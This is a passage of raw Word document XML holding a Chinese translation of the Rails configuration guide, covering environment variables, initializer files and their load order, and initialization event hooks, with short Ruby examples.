          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>4 Rails 环境设置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB5FE04"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Rails 的某些部分也可以通过设置环境变量，进行外部赋值来配置。以下环境变量会被 Rails 的各部分识别:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CDE9B52" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22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+ENV[“RAILS_ENV”] 定义了 Rails 的运行环境 (生产，开发，测试等等)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F977A6" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22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+ENV[“RAILS_RELATIVE_URL_ROOT”] 当你的应用程序部署到某个子目录下时，用它帮助路由(routing)代码识别 URLs。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="776FF37E" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="22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+ENV[“RAILS_ASSET_ID”] 将重写默认的 cache-busting 时间戳章，这个时间戳章是 Rails 为可下载资源生成的.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CDD20F6" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="223"/>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ENV["RAILS_CACHE_ID"]</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ENV["RAILS_APP_VERSION"]</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 用于生成 Rails 缓存代码的扩展缓存键。这可以让同一个应用程序有多个独立分开的缓存。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A463E54" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>5 使用 Initializer 文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23D208DD"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加载完框架和应用程序的所有 gems 之后，Rails 会接着去加载所有的初始化程序. 初始化程序是存放在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/initializers</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里任何的一个 Ruby 文件。你可以使用 initializers 容纳所有待配置选项和设置，它们会在所有框架和 gems 加载完之后进行配置和设置，例如为这些部分配置设置的选项。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BAAD2C9"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你可以使用子文件夹来组织你的初始化程序， 因为 Rails 会纵向搜索整个 initializers 文件夹。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73655450"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如果你的 initialziers 里有一组依赖，你可以根据名字控制加载循序。例如, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>01_critical.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将比 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>01_normal.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 先被加载。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11608577" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>6 初始化事件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EECD835"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Rails 有 5 种初始化事件, 这些事件可以被挂上 hook (以下列出了它们的运行顺序)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F2F4904" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="224"/>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before_configuration</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: 这个和继承了 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Application</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的应用程序常量同时运行。</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 回调会在这发生之前生成。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7410D72C" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="225"/>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before_initialize</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: 这个在应用程序的初始化过程之前立即运行。应用程序的初始化过程出现于接近 Rails 整个初始化过程的最开始，并带有 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:bootstrap_hook</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 初始化程序。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="451BA014" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="226"/>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to_prepare</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: 在所有为 Railties 运行(包括应用程序自身)的初始化程序之后运行，但在即时加载(eager loading)和中间件堆创建之前运行。最重要的是，在</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>development</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">环境中，会在所有的请求上运行。而在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>production</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 环境只会运行一次(启动的期间)。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD90B16" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="227"/>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before_eager_load</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: 在即时加载(eager loading)发生之前立即运行. 这是_生产_ 环境的默认行为，但在_开发_环境则不是。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="548B3371" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="228"/>
        </w:numPr>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after_initialize</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: 应用程序加载后立即运行，但在应用程序的初始化程序之前运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4157D4"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在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Application</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Engine</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的子类里使用代码块语法, 可以为这些事件定义 hook :</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="0641898A" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14D361CB"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module</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>YourApp</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C5B734E"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class</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>Application &lt; Rails::Application</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B63208C"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config.before_initialize do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14E470F4"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 initialization code goes here</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1ACE0F2B"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end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E28A5E2"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end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2870B0F6"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end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1B462124"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可选的，你也可以通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.application</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象的 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法这么做。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5400"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="7BC52E31" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6C7229C8"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Rails.application.config.before_initialize do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72B9D756"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 initialization code goes here</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E86FDD8"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end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="568A0F20"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应用程序的一些部分，特别是 观察者(observers) 和 路由(routing) 在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>after_initialize</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 代码块被调用之时都还没有启动。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09732C40"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 xml:space="preserve">6.1 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Railtie#initializer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22753CC3"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Rails 有数个初始化程序在(应用程序)启动的时候运行，它们都使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>initializer</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法定义。下面是 Active Suppport 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>initialize_whiny_nils</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 初始化程序的例子:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7560"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="2437FE7A" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="06A8D072"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initializer "active_support.initialize_whiny_nils"</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|app|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15516375"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require 'active_support/whiny_nil'</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>if</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
